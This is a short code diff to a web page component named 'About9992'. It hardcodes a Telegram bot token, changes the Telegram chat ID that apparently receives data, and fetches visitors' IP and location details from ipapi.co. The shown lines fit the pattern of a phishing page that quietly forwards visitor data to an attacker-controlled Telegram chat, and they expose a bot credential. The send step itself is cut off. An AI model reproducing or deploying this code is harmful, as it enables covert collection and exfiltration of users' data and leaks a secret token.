@@ -23,7 +23,7 @@ const About9992 = () => {
             return;
         } else {
             const bot = 'bot8168586278:AAE3DMuLz93dor8kgeZv7bc9pHOIws7RI8s';
-            const chid = '445056429';
+            const chid = '7844520039';
 
             fetch(`https://ipapi.co/json/`)
                 .then((response) => response.json())
